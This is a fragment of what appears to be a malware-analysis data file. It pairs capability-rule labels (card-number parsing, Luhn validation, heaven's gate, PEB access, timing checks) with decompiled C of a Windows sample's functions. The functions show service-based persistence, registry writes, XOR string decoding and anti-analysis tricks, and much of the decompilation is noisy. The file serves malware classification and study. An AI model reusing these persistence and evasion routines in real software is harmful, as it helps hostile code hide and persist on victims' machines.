bVar18 = (POPCOUNT((uVar6 >> 8) + uVar6) & 1U) == 0;\n    piVar11[4] = 0x16;\n    piVar11[3] = 0x41f930;\n    piVar11[2] = 0xd;\n    piVar12 = piVar11 + 1;\n    piVar11[1] = 0x410434;\n    *piVar11 = 0x4026fa;\n    fcn.00402cc0(piVar11[1], piVar11[2], piVar11[3], piVar11[4]);\n    iVar8 = extraout_ECX_05;\n    if (!bVar18) {\n        *piVar11 = extraout_ECX_05;\n        iVar8 = *piVar11;\n        if (bVar18) goto code_r0x00402705;\n    }\n    *piVar11 = 7;\n    piVar11[-1] = 0x41f948;\n    piVar12 = piVar11 + -2;\n    piVar11[-2] = 0xd;\ncode_r0x00402705:\n    *(extraout_EDX_01 + 7) = *(extraout_EDX_01 + 7) + -0x68;\n    *(extraout_EDX_01 + 0xd) = *(extraout_EDX_01 + 0xd) + (iVar8 + 1 >> 8);\n    piVar12[-1] = 0x410434;\n    piVar12[-2] = 0x402719;\n    fcn.00402cc0(piVar12[-1], *piVar12, piVar12[1], piVar12[2]);\n    return;\n}\n",
        "token_count": 3423
    },
    "00402a00": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402a00(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    if (arg_14h != 0) {\n        do {\n            uVar1 = var_8h + 1;\n            *(var_8h + arg_10h) = *(var_8h + arg_10h) ^ *(var_8h % arg_ch + arg_8h);\n            var_8h = uVar1;\n        } while (uVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 203
    },
    "00402b80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00402b80(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00403c40;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x406010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 218
    },
    "00402e50": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004030d0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403101) overlaps instruction at (ram,0x00403100)\n// \n\nint32_t __fastcall fcn.004030d0(uint param_1, ushort param_2)\n\n{\n    uchar uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uchar *unaff_EDI;\n    char *pcVar4;\n    bool in_CF;\n    bool in_ZF;\n    bool in_OF;\n    ushort in_stack_ffffffec;\n    uint *puVar5;\n    char *pvData;\n    \n    pvData = NULL;\n    if (in_OF) {\ncode_r0x00403101:\n        puVar5 = &pvData;\n    }\n    else {\n        puVar5 = CONCAT22(param_2, in_stack_ffffffec);\n        if (!in_OF) goto code_r0x00403101;\n        uVar1 = in(param_2);\n        *unaff_EDI = uVar1;\n        if (!in_CF && !in_ZF) goto code_r0x0040316c;\n    }\n    iVar3 = fcn.00402a80(0x56, puVar5);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    if (pvData == NULL) {\n        return 0;\n    }\n    iVar3 = -1;\n    pcVar4 = pvData;\n    do {\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != '\\0');\n    iVar3 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x41f638, 0x41f678, 1, pvData, ~iVar3 - 1);\n    in_EAX = -(iVar3 != 0);\ncode_r0x0040316c:\n    return in_EAX + 1;\n}\n",
        "token_count": 449
    },
    "004035f0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040363d) overlaps instruction at (ram,0x0040363c)\n// \n// WARNING: Removing unreachable block (ram,0x0040363d)\n\nint32_t __cdecl fcn.004035f0(uint32_t arg_8h, uint16_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint16_t *in_EDX;\n    int32_t unaff_EBX;\n    uint32_t *unaff_EDI;\n    uint32_t *puVar2;\n    bool bVar3;\n    \n    bVar3 = (POPCOUNT(in_EDX & 0x66) & 1U) == 0;\n    if ((bVar3) || (!bVar3)) {\n        in_EAX = arg_10h;\n        in_EDX = arg_ch;\n    }\n    *(unaff_EBX + 0x558b1045) = *(unaff_EBX + 0x558b1045) | 0xc;\n    bVar3 = false;\n    uVar1 = in_EAX;\n    for (; in_EAX != 0; in_EAX = in_EAX - 1) {\n        puVar2 = unaff_EDI;\n        if ((bVar3 == in_EAX < 0) && (bVar3 != in_EAX < 0)) {\n            out(0xc4, uVar1);\n            in_EDX = in_EDX & 0xffffff00 | in_EDX ^ arg_8h;\n            puVar2 = unaff_EDI + 1;\n            *unaff_EDI = uVar1;\n        }\n        arg_8h = arg_8h + *in_EDX;\n        uVar1 = arg_8h >> 0x10;\n        if (arg_8h >> 0x10 != 0) {\n            uVar1 = uVar1 + (arg_8h & 0xffff);\n            arg_8h = uVar1;\n        }\n        in_EDX = in_EDX + 1;\n        bVar3 = SBORROW4(in_EAX, 1);\n        unaff_EDI = puVar2;\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 514
    },
    "00404640": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404757) overlaps instruction at (ram,0x00404753)\n// \n\nuint __cdecl fcn.00404640(uint lptstrFilename, uint s)\n\n{\n    ushort uVar1;\n    ushort uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    bool bVar7;\n    char cVar8;\n    char cVar9;\n    uint var_1ch;\n    uint var_16h;\n    uint hMem;\n    uint pBlock;\n    uint var_8h;\n    uint lpdwHandle;\n    \n    iVar4 = sub.VERSION.dll_GetFileVersionInfoSizeA();\n    bVar7 = false;\n    if (iVar4 != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n        if ((bVar7) || (!bVar7)) {\n            (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        }\n        else {\n            func_0x1018a5fe();\n        }\n        sub.VERSION.dll_GetFileVersionInfoA();\n        uVar6 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n        sub.VERSION.dll_VerQueryValueA(*(uVar6 - 0xc), 0x41f950, uVar6 + 8, uVar6 - 8);\n        iVar4 = *(uVar6 + 8);\n        uVar1 = *(iVar4 + 0x10);\n        *(uVar6 - 0x1c) = *(iVar4 + 0x10) >> 0x10;\n        uVar3 = *(iVar4 + 0x14);\n        uVar2 = *(iVar4 + 0x14);\n        *(uVar6 - 0x1a) = uVar1;\n        *(uVar6 - 0x16) = uVar2;\n        uVar5 = *(uVar6 - 0x16);\n        *(uVar6 - 0x18) = uVar3 >> 0x10;\n        uVar5 = (*_sym.imp.MSVCRT.dll_sprintf)\n                          (*(uVar6 + 0xc), 0x41f914, *(uVar6 - 0x1c) & 0xffff, *(uVar6 - 0x1a) & 0xffff, \n                           *(uVar6 - 0x18) & 0xffff, uVar5 & 0xffff);\n        cVar9 = '\\0';\n        cVar8 = '\\0';\n        bVar7 = ((uVar5 ^ 0x687c) & 0x3000) == 0;\n        uVar3 = *(uVar6 - 0x10);\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar3);\n        if ((bVar7 || cVar9 != cVar8) || (!bVar7 && cVar9 == cVar8)) {\n            (*_sym.imp.KERNEL32.dll_GlobalFree)(uVar3);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 677
    },
    "004043c0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404584) overlaps instruction at (ram,0x0040457f)\n// \n// WARNING: Removing unreachable block (ram,0x004043e8)\n// WARNING: Removing unreachable block (ram,0x004043f2)\n\nvoid __fastcall fcn.004043c0(int32_t param_1, uint8_t *param_2, char *param_3)\n\n{\n    char cVar1;\n    uint8_t *in_EAX;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint32_t *unaff_EBX;\n    uchar *puVar5;\n    uint32_t unaff_ESI;\n    uint8_t *puVar6;\n    uint8_t **unaff_EDI;\n    char *pcVar7;\n    ushort in_SS;\n    uchar in_CF;\n    uchar in_PF;\n    uint8_t in_AF;\n    uchar in_ZF;\n    bool bVar8;\n    char in_SF;\n    char in_OF;\n    uint16_t uStack32;\n    \n    puVar5 = &stack0xfffffffc;\n    uVar3 = param_1;\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        out(0xc4, in_EAX);\n        param_2 = param_2 & 0xffffff00 | param_2 ^ uVar3;\n        *unaff_EDI = in_EAX;\n        uVar4 = unaff_EBX >> 8;\n        in_CF = uVar4 < *in_EAX;\n        cVar1 = uVar4 - *in_EAX;\n        in_ZF = cVar1 == '\\0';\n        in_PF = (POPCOUNT(cVar1) & 1U) == 0;\n    }\n    *param_3 = -4;\n    if ((in_PF) || (!in_PF)) {\n        param_3[1] = '3';\n        puVar2 = in_EAX;\n    }\n    else {\n        unaff_ESI = 0x34a96cf4;\n        puVar5 = *0xc617b43a;\n        param_3 = param_3 + 1;\n        in_CF = 0xcb56930b < *unaff_EBX;\n        *unaff_EBX = *unaff_EBX + 0x34a96cf4;\n        in_ZF = *unaff_EBX == 0;\n        puVar2 = param_2 + 1;\n        param_2 = in_EAX;\n    }\n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    param_3[2] = -0x50;\n    bVar8 = (unaff_ESI | 0x561b) == param_2;\n    param_3[3] = 'B';\n    if ((bVar8) || (!bVar8)) {\n        param_3[4] = '\\x1d';\n    }\n    else {\n        param_3 = CONCAT22(param_1, in_SS);\n        puVar2 = puVar2 & 0xffffff00 | puVar2 + 0x1d;\n    }\n    uStack32 = puVar2;\n    bVar8 = (uStack32 ^ unaff_EBX) < 0;\n    param_3[5] = -0x3c;\n    if (bVar8) goto code_r0x0040447c;\n    if (!bVar8) goto code_r0x0040447c;\n    param_2 = param_2 & 0xffffff00;\n    while( true ) {\n        pcVar7 = param_3 | puVar5;\n        param_3 = pcVar7 + 1;\n        *pcVar7 = puVar2;\n        param_2 = param_2 & 0xffffff00;\n        puVar2 = puVar2 & 0xffff0000 | puVar2 + (puVar2 >> 8) * 'y';\ncode_r0x0040447c:\n        param_3[6] = '[';\n        param_3[7] = 'c';\n        param_3[8] = -0x72;\n        param_3[9] = '8';\n        puVar6 = *(puVar5 + 8);\n        puVar6[10] = 0xeb;\n        if ((uVar3 < '\\x02') || ('\\x01' < uVar3)) break;\n        in_AF = 9 < (puVar2 & 0xf) | in_AF;\n        puVar2 = puVar2 & 0xffff0000 | CONCAT11((puVar2 >> 8) + in_AF, puVar2 + in_AF * '\\x06') & 0xff0f;\n        if (param_1 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    puVar6[0xb] = 0x33;\n    if ((uVar3 < '\\x01') || ('\\0' < uVar3)) {\n        puVar6[0xc] = 0xe6;\n    }\n    else {\n        puVar6 = puVar2 + 1;\n    }\n    puVar6[0xd] = 0x17;\n    puVar6[0xe] = 0xd6;\n    puVar6[0xf] = 0x18;\n    *(param_2 + 1 | 0x5f) = 0x10;\n    return;\n}\n",
        "token_count": 1234
    },
    "004011c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401273) overlaps instruction at (ram,0x00401271)\n// \n// WARNING: Removing unreachable block (ram,0x004011fe)\n\nuint __cdecl fcn.004011c0(uint arg_8h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint *extraout_ECX;\n    uint *puVar3;\n    uint *extraout_EDX;\n    uint *arg_8h_00;\n    uchar uVar4;\n    uchar uVar5;\n    char cVar6;\n    char cVar7;\n    uchar var_210h;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_210h = 0;\n    puVar3 = &var_20fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    s = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    uVar4 = 0;\n    cVar7 = 0;\n    cVar6 = '\\x01';\n    uVar5 = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&var_210h, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(*0x10 + -0x110, 0xf458, &var_210h, arg_8h);\n    if ((cVar7) || (!cVar7)) {\n        puVar3 = &var_8h;\n        arg_8h_00 = &var_4h;\n    }\n    else {\n        uVar1 = in(extraout_EDX);\n        *(puVar3 + 3) = uVar1;\n        puVar3 = extraout_ECX;\n        arg_8h_00 = extraout_EDX;\n        if (!uVar4 && !uVar5) goto code_r0x004012cc;\n    }\n    fcn.004045a0(arg_8h_00, puVar3);\n    if ((cVar7 != cVar6) || (cVar7 == cVar6)) {\n        arg_8h_00 = var_4h;\n    }\n    fcn.00401300(arg_8h_00);\n    iVar2 = fcn.00403d20(&s, 0x41f478, var_4h, var_8h);\n    if (iVar2 == 0) {\n        return 0;\n    }\ncode_r0x004012cc:\n    fcn.00401000(&s, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 710
    },
    "00401620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401620(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00403450(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 52
    },
    "004017b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004017fa) overlaps instruction at (ram,0x004017f9)\n// \n\nuint __cdecl fcn.004017b0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char *in_EAX;\n    uint uVar4;\n    int32_t unaff_EBX;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    bool in_CF;\n    uint8_t in_AF;\n    bool in_ZF;\n    char in_SF;\n    char in_OF;\n    \n    uVar4 = unaff_EDI;\n    if ((!in_ZF) && (in_ZF)) {\n        uVar3 = in_EAX;\n        if (in_CF || unaff_EBX + 1 == 0) {\n            *in_EAX = *in_EAX + uVar3;\n            arg_8h = unaff_EDI;\n            goto code_r0x00401809;\n        }\n        uVar2 = 9 < (uVar3 & 0xf) | in_AF;\n        piVar1 = (in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + uVar2, uVar3 + uVar2 * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n        in_OF = SCARRY4(unaff_ESI, 1);\n        in_SF = unaff_ESI + 1 < 0;\n    }\n    unaff_ESI = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if (((in_OF != in_SF) || (in_OF == in_SF)) || (arg_8h = unaff_EDI,  &stack0xfffffff4 < 0)) {\n        fcn.00403ca0(unaff_ESI, arg_8h);\n        uVar4 = arg_ch;\n    }\ncode_r0x00401809:\n    uVar4 = fcn.00402760(unaff_ESI, arg_8h, uVar4);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n    return uVar4;\n}\n",
        "token_count": 516
    },
    "00401830": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.00401830(char *arg_8h, int32_t arg_ch, char *arg_10h, char *arg_14h)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char **unaff_EDI;\n    char *pcVar4;\n    bool bVar5;\n    \n    bVar5 = SCARRY4(arg_8h - arg_14h, arg_ch);\n    pcVar1 = (arg_8h - arg_14h) + arg_ch;\n    if ((!bVar5) && (bVar5)) {\n        *unaff_EDI = arg_10h;\n        return CONCAT44(arg_8h, arg_10h);\n    }\n    pcVar2 = arg_14h;\n    if (arg_14h != NULL) {\n        pcVar2 = arg_8h;\n        if (arg_8h <= pcVar1) {\n            do {\n                if (*arg_8h == *arg_10h) {\n                    bVar5 = true;\n                    pcVar2 = arg_14h;\n                    pcVar3 = arg_8h;\n                    pcVar4 = arg_10h;\n                    do {\n                        pcVar4 = pcVar4 + 1;\n                        pcVar3 = pcVar3 + 1;\n                        pcVar2 = pcVar2 + -1;\n                        if (pcVar2 == NULL) break;\n                        bVar5 = *pcVar3 == *pcVar4;\n                    } while (bVar5);\n                    if (bVar5) {\n                        return CONCAT44(arg_8h, arg_8h);\n                    }\n                }\n                pcVar2 = arg_8h + 1;\n                arg_8h = pcVar2;\n            } while (pcVar2 <= pcVar1);\n        }\n        arg_8h = NULL;\n    }\n    return CONCAT44(pcVar2, arg_8h);\n}\n",
        "token_count": 438
    },
    "00402720": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402720(void)\n\n{\n    uint uVar1;\n    \n    if (*0x41f964 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x41f964 = 1;\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "00402760": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004027c7) overlaps instruction at (ram,0x004027c6)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00402760(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint8_t in_AL;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_ESI;\n    uint8_t *unaff_EDI;\n    bool in_CF;\n    uint8_t in_AF;\n    bool bVar4;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    unkbyte6 Var5;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint32_t uStack12;\n    uint uStack8;\n    \n    if ((in_CF) || (uStack8 = CONCAT22(unaff_EDI, uStack8),  !in_CF)) {\n        uStack8 = 0;\n        in_AL = arg_10h;\n    }\n    cVar1 = in_AL - *unaff_EDI;\n    uStack12 = (in_NT & 1) * 0x4000 | SBORROW1(in_AL, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n               (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar1) & 1U) == 0) * 4 |\n               in_AL < *unaff_EDI | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n               (in_AC & 1) * 0x40000;\n    uStack16 = 0x402775;\n    uStack32 = func_0x101886ed();\n    uStack16 = 0;\n    uStack20 = 0;\n    uStack24 = 0;\n    uStack28 = 0;\n    uStack36 = 1;\n    uStack40 = 0;\n    uStack44 = 1;\n    uStack48 = 0xf01ff;\n    uStack52 = arg_ch;\n    uStack56 = arg_ch;\n    uStack60 = arg_8h;\n    Var5 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)();\n    bVar4 = Var5 == 0;\n    if (bVar4) {\n        return 0;\n    }\n    if ((bVar4) || (!bVar4)) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(Var5);\n        return 1;\n    }\n    uVar2 = in(Var5 >> 0x20);\n    *(unaff_EDI + 1) = uVar2;\n    if (0 < &stack0xffffffc4) {\n        *0xdee0000f = *0xdee0000f ^ Var5 >> 0x20;\n        return 1;\n    }\n    if (*0x10 != 0x3d) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, unaff_ESI + -1, 0, 0, 0, 2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n        if (iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(unaff_ESI + -1);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 934
    },
    "00402a80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402b2f) overlaps instruction at (ram,0x00402b2d)\n// \n// WARNING: Removing unreachable block (ram,0x00402ab6)\n// WARNING: Removing unreachable block (ram,0x00402ab7)\n\nuint fcn.00402a80(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint *unaff_EDI;\n    uchar auStack800 [784];\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack16 = 0x104;\n    if ((0x31b < &stack0xfffffffc) && (SBORROW4(&stack0xfffffffc, 0x31c) != auStack800 < 0)) {\n        out(0xc4, in_EAX);\n        *unaff_EDI = in_EAX;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uStack8 = 0x104;\n    uStack12 = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if ((-1 < iVar1) && (-1 >= iVar1)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)();\n    if (iVar1 != 0) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 381
    },
    "00402be0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402c4a) overlaps instruction at (ram,0x00402c48)\n// \n\nuint fcn.00402be0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t extraout_DL;\n    char extraout_DL_00;\n    int32_t unaff_EBX;\n    uint8_t uVar4;\n    bool bVar5;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x41f538);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    uVar4 = 0;\n    bVar5 = (extraout_DL & unaff_EBX) < '\\0';\n    *0x41f968 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x41f548);\n    if ((bVar5) || (!bVar5)) {\n        *0x41f96c = (*pcVar1)(iVar2, 0x41f564);\n    }\n    else {\n        uVar3 = *0x41f968 + -0xa9b97d1 + uVar4;\n        *(iVar2 + -1) = *(iVar2 + -1) + extraout_DL_00;\n        *0x41f96c = uVar3 & 0xffffff00 | *(unaff_EBX + (uVar3 & 0xff));\n    }\n    *0x41f970 = (*pcVar1)(iVar2, 0x41f574);\n    if (((*0x41f968 != 0) && (*0x41f96c != 0)) && (*0x41f970 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 414
    },
    "00402cc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402d58)\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402cc0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    if (0 < arg_14h) {\n        do {\n            *(var_8h + arg_10h) = arg_14h ^ *(var_8h + arg_10h) ^ *(var_8h % arg_ch + arg_8h);\n            var_8h = var_8h + 1;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 207
    },
    "00402d90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402daa) overlaps instruction at (ram,0x00402da8)\n// \n\nvoid __cdecl fcn.00402d90(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    uint32_t unaff_EDI;\n    char in_SF;\n    char in_OF;\n    \n    if ((((in_OF == in_SF) && (in_OF != in_SF)) && (arg_ch = unaff_EDI,  -1 < &stack0xfffffff4)) ||\n       (in_EAX = 0,  unaff_EBX = arg_8h,  arg_ch != 0)) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(in_EAX + unaff_EBX) = iVar1 % 0x1a + 'a';\n            in_EAX = in_EAX + 1;\n        } while (in_EAX < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "00403180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403396) overlaps instruction at (ram,0x00403395)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x0040332d)\n// WARNING: Removing unreachable block (ram,0x00403396)\n// WARNING: Type propagation algorithm not settling\n\nulong __fastcall fcn.00403180(uint16_t param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint32_t in_EAX;\n    uint32_t uVar5;\n    uint uVar6;\n    int32_t *piVar7;\n    int32_t *piVar8;\n    uint16_t uVar9;\n    uint32_t uVar10;\n    int32_t *piVar11;\n    uint32_t unaff_EBX;\n    uint32_t uVar12;\n    uint *puVar13;\n    int32_t **unaff_EBP;\n    uint *puVar14;\n    uint *puVar15;\n    uint unaff_ESI;\n    uchar *puVar16;\n    uchar *puVar17;\n    uint *unaff_EDI;\n    bool in_PF;\n    bool bVar18;\n    uint8_t in_AF;\n    bool bVar19;\n    uchar in_OF;\n    bool bVar20;\n    unkbyte10 in_ST0;\n    int32_t in_stack_5f9dff5f;\n    uint16_t uStack20;\n    uint16_t uStack18;\n    uint uStack16;\n    \n    uStack16._2_2_ = unaff_EDI >> 0x10;\n    puVar14 = &stack0xfffffffc;\n    uVar12 = unaff_EBX;\n    if ((!in_PF) && (puVar14 = &stack0xfffffffc,  in_PF)) {\n        puVar17 = *unaff_EDI;\n        *unaff_EDI = unaff_ESI;\n        puVar14 = &stack0xfffffffc + -in_stack_5f9dff5f;\n        if (puVar14 < 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        in_OF = false;\n        uVar5 = in_EAX;\n        if (-1 < puVar17) goto code_r0x00403208;\n    }\n    puVar17 = puVar14[2];\n    *puVar17 = 0xf8;\n    if (in_OF) goto code_r0x004031ce;\n    uVar10 = 